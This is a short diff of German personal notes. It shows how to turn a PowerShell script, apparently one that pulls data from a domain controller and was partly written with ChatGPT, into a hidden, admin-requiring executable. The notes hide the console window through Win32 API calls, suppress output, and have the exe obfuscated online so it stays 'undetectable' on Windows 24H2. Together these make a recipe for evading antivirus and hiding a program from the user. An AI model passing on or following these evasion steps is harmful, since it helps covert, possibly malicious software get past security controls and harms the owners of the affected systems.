@@ -1,1 +1,20 @@
-Invoke-PS2EXE "C:\Users\jonas\Desktop\Private_script_pull-DC-Version\run.ps1" "C:\Users\jonas\Desktop\Private_script_pull-DC-Version\converted.exe" -noConsole -requireAdmin -noOutput -noError
+In den PowerShell Skript MUSS 
+
+
+
+# Versteckt das PowerShell-Fenster
+Add-Type -Name Win32 -Namespace System -MemberDefinition '
+    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+$consolePtr = [System.Win32]::GetConsoleWindow()
+[System.Win32]::ShowWindow($consolePtr, 0)  # Fenster verstecken
+
+Dann in Admin PowerShell ISE
+
+Invoke-PS2EXE "C:\Users\jonas\Desktop\Private_script_pull-DC-Version\runCHATGPT.ps1" "C:\Users\jonas\Desktop\Private_script_pull-DC-Version\convertedCHATGPT.exe" -noConsole -requireAdmin -noOutput
+
+Danach auf die Website und die Exe Obfuscaten lassen (undetectable)
+freeobfuscator.com
+
+Done jetzt SOLLTE die exe undetectable sein (Es geht auf Windows 24H2)
